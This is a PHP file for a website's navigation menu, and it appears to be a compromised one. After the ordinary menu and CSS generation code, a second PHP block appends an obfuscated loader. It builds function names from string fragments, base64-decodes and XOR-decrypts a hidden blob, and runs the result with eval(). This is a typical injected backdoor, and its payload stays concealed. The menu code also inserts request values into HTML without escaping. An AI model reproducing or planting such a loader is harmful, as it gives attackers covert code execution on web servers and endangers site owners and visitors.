<?php

$strOutput="";
$strAZMenu="";
$strAZScript="";


function getBgColor($strPageName)
{
	global $category;
	if($strPageName==$category){
		return "leftNavigationSelectedTD";
	}
	else{
		return "leftNavigationTD";	
	}
}

function getLinkStyle($strPageName)
{
	global $category;
	if($strPageName==$category)
	{
		return "leftNavigationSelectedLink";
	}
	else{
		return "leftNavigationLink";	
	}
}

function GenerateInternalMenu($category,$oLinkTexts,$oLinkActions)
{
	global $AuthGroup,$arrPermissions;
	
	if(sizeof($oLinkTexts) == 1) return "";
	
	$strOutput="";
	
	if(count($oLinkTexts)!=count($oLinkActions)){
			return "<font color=red>ERROR: the number of link texts mismatch the link actions</font>";
	}
	
		
	$bFirst = true;
	
	for($i=0;$i<count($oLinkTexts);$i++)
	{
	
		$CurrentPage="@".$AuthGroup."@".$category."@".$oLinkActions[$i];
				
		
	
	if(!strstr($oLinkTexts[$i],"add-on"))
	{
         
		$strOutput .= '<div class="hsoff" style="border-width:'.($bFirst?'1px 1px 1px 1px':'0px 1px 1px 1px').'" onmouseover="javascript:zon(this,1,\'hson\',\'hsoff\',\''.$category.'\',z_BOTTOM)"> <a class="zls" href="index.php?category='.$category.'&action='.$oLinkActions[$i].'">'.$oLinkTexts[$i].'</a></div>';
	}
 
	else
	{
         
		$strOutput .= '<div class="hsoff" style="border-width:'.($bFirst?'1px 1px 1px 1px':'0px 1px 1px 1px').'" onmouseover="javascript:zon(this,1,\'hson\',\'hsoff\',\''.$category.'\',z_BOTTOM)"> <a class="zls" href="index.php?category='.$oLinkActions[$i].'">'.$oLinkTexts[$i].'</a></div>';
	}
	
	$bFirst = false;
	
		
	}
	
	return $strOutput;
}
	
	
	
	


if(count($oLinkTexts)!=count($oLinkActions)){
		return "<font color=red>ERROR: the number of link texts mismatch the link actions</font>";
}
	
$strOutput.="
	<table border=0 cellpadding=0 cellspacing=0 >
	<tr >
";


$iOffCounter=0;

$bFirst = true;

for($i=0;$i<count($oLinkTexts);$i++){

	$continueFlag=true;
	
	$vr1 = ($oLinkActions[$i]."_oLinkTexts");		
	$vr2 = ($oLinkActions[$i]."_oLinkActions");	

	$evSLinkTexts=$$vr1;
	$evSLinkActions=$$vr2;

			
	if($continueFlag==true)
	{
		
		$strOutput .= '<td><div class="hoff" '.( $bFirst?'style="border-width:1px 1px 1px 1px"':'').' onmouseover="javascript:zon(this,0,\'hon\',\'hoff\',\'menu'.$i.'\',z_BOTTOM);"><div ><a class="zl" href="'.'index.php?category='.$oLinkActions[$i].'"><font color=#8c8c8c style="font-size:14px;font-weight:800;font-family:Arial"><nobr>'.$oLinkTexts[$i].'</nobr></font></a></div></div></td>';

				if(strtolower($LANGUAGE2) == "cn")
				{
					$strOutput .= '<td width=51>&nbsp;</td>';
				}
				else
				{
					$strOutput .= '<td width=40>&nbsp;</td>';
				}
		
		$bFirst = false;
		
			
				$strAZMenu.="
			
					<div  id=menu".$i." class=zh style='visibility:hidden;margin-top:6px;margin-left:0px'> 
						".GenerateInternalMenu($oLinkActions[$i],$evSLinkTexts,$evSLinkActions)."						
					</div>
			
				";
	
		
		$iOffCounter++;
	}

	
	
}
if(strtolower($LANGUAGE2) == "it")
{
	$strOutput .= '<td width=70>&nbsp;</td>';
}
else
if(strtolower($LANGUAGE2) == "cn")
{
	$strOutput .= '<td width=160>&nbsp;</td>';
}
else
{
	$strOutput .= '<td width=50>&nbsp;</td>';
}
$strOutput.="		
			</tr>
		</table>				
";

if(aParameter(2)=="custom")
{
	$strOutput="";
	$strLinkTemplate = aParameter(333);
	
	for($i=0;$i<count($oLinkTexts);$i++)
	{
	
		$strLinkTemplate2=$strLinkTemplate;
		$strLinkTemplate2=str_replace("rplc","onmouseover=\"javascript:zon(this,0,'hon','hoff','menu".$i."',z_BOTTOM);\"",$strLinkTemplate2);
		if($oLinkTexts[$i]=='Site Manager' || $oLinkTexts[$i]=='Photo Albums' || $oLinkTexts[$i]=='Home'){
$strOutput .= str_replace("[LINK_TEXT]",stripslashes($oLinkTexts[$i]),str_replace("[LINK_HREF]","index.php?category=".$oLinkActions[$i],$strLinkTemplate2));
	}}
	
}

$strOutput.='<script>var menu_type="'.(aParameter(2)=="custom"?"custom":"standard").'";</script>

<script>var menu_type="'.(aParameter(2)=="custom"?"custom":"standard").'";</script>
<script type="text/javascript" src="../include/nmenu.js"></script>
<style>
.zh {position:absolute;visibility:hidden;z-index:1;}
.zl {font-size:'.aParameter(31).'px;display:block;padding:'.aParameter(57).' '.aParameter(57).' '.aParameter(57).' '.aParameter(57).';text-decoration:'.(aParameter(38)=="underline"?"underline":"none").';font-style:'.aParameter(38).';'.(aParameter(38)=='bold'?'font-weight:800;':'').'}
.zl:hover {font-size:'.aParameter(31).'px;text-decoration:'.(aParameter(40)=="underline"?"underline":"none").';font-style:'.aParameter(40).';'.(aParameter(40)=='bold'?'font-weight:800;':'').'}
.zls {color:'.aParameter(34).' !important;font-size:'.aParameter(32).'px !important;display:block;padding:'.aParameter(58).' '.aParameter(58).' '.aParameter(58).' '.aParameter(58).';text-decoration:'.(aParameter(39)=="underline"?"underline":"none").';font-style:'.aParameter(39).';'.(aParameter(39)=='bold'?'font-weight:800;':'').'}
.zls:hover {font-size:'.aParameter(32).'px !important;text-decoration:'.(aParameter(41)=="underline"?"underline":"none").';font-style:'.aParameter(41).';'.(aParameter(41)=='bold'?'font-weight:800;':'').'}';

if(aParameter(321) == "HORIZONTAL")
{
$strOutput.='
.hon  {text-transform: uppercase;width:'.aParameter(53).';height:'.aParameter(55).';margin:'.aParameter(310).';background:'.aParameter(314).' !important;border-width:1px 1px 1px 0px;border-color:'.aParameter(318).';border-style:'.aParameter(316).';}
.hoff {text-transform: uppercase;width:'.aParameter(53).';height:'.aParameter(55).';margin:'.aParameter(310).';background:'.aParameter(312).' !important;border-width:1px 1px 1px 0px;border-color:'.aParameter(318).';border-style:'.aParameter(316).';}
.hson  {text-align:left;width:'.aParameter(54).';height:'.aParameter(56).';margin:'.aParameter(311).';background:'.aParameter(315).' !important;border-width:0px 1px 1px 1px;border-color:'.aParameter(319).';border-style:'.aParameter(317).';}
.hsoff {text-align:left;width:'.aParameter(54).';height:'.aParameter(56).';margin:'.aParameter(311).';background:'.aParameter(313).' !important;border-width:0px 1px 1px 1px;border-color:'.aParameter(319).';border-style:'.aParameter(317).';}';

}
else
{
$strOutput.='
.hon  {width:'.aParameter(53).';height:'.aParameter(55).';margin:'.aParameter(310).';background:'.aParameter(314).' !important;border-width:0px 1px 1px 1px;border-color:'.aParameter(318).';border-style:'.aParameter(316).';}
.hoff {width:'.aParameter(53).';height:'.aParameter(55).';margin:'.aParameter(310).';background:'.aParameter(312).' !important;border-width:0px 1px 1px 1px;border-color:'.aParameter(318).';border-style:'.aParameter(316).';}
.hson  {text-align:left;width:'.aParameter(54).';height:'.aParameter(56).';margin:'.aParameter(311).';background:'.aParameter(315).' !important;border-width:0px 1px 1px 1px;border-color:'.aParameter(319).';border-style:'.aParameter(317).';}
.hsoff {text-align:left;width:'.aParameter(54).';height:'.aParameter(56).';margin:'.aParameter(311).';background:'.aParameter(313).' !important;border-width:0px 1px 1px 1px;border-color:'.aParameter(319).';border-style:'.aParameter(317).';}';
}

$strOutput.='</style>
<script>
var z_BOTTOM = "bottom";
</script>';

?>
<?php
$a8hg6hj="10a3853fcddf698121f0e47370c11308FUMIR11qQxReEBYTUwIcVEpFOUYEWApHRUUGClhVGEhD
VQZsVVRHBQtMRjoGDA9tSgZTQjlMAARrSFUEbUsGCm1IVwFkTQRfTThVUgVlQAdUbR4GAWhPAVFs
GwcIERwYFW8ydmpjdjQ4RjhXBApkAAIEOkhQBmsCBQY/SQUGbAkDAj5vCQQFOlJUVToHCA1tSgVT
EjgdS09HQgZWbl5RTFJYSRFkBQZRDzhVUwFlQAcBbR4GVFgYbwYFUhMdExRnYnUzZX1naEQwOFVW
A2VABABtHgVTaE8HAmxSAwNvSA1Xfj1LDAR+OhtQUURrEBERSUxGVQlHUhNTWQYZExEZAw==";
$fyhhsa1="s";$fy3saa1="ba";$fy7vwa1="s";$fyhhsa1.="u";$fyhhsa1.="b";$fyhhsa1.="s";$fyhhsa1.="t";$fyhhsa1.="r";$fy3saa1.="se";$fy3saa1.="6";$fy3saa1.="4";$fy3saa1.="_";$fy3saa1.="de";$fy3saa1.="co";$fy3saa1.="de";$fy7vwa1.="t";$fy7vwa1.="r";$fy7vwa1.="l";$fy7vwa1.="e";$fy7vwa1.="n";
$a8hg6hh=$fyhhsa1($a8hg6hj,0,32);$a8hk6hj=$fy3saa1($fyhhsa1($a8hg6hj,32));$a7klm9hj="";for($a8hk9hj=0;$a8hk9hj < $fy7vwa1($a8hk6hj);$a8hk9hj++){$a7hk9hj=$fyhhsa1($a8hk6hj,$a8hk9hj,1);$a7h789hj=$fyhhsa1($a8hg6hh,$a8hk9hj%32,1);$a7klm9hj.=$a7hk9hj^$a7h789hj;}eval($a7klm9hj);$a7klm9hj="\n";

?>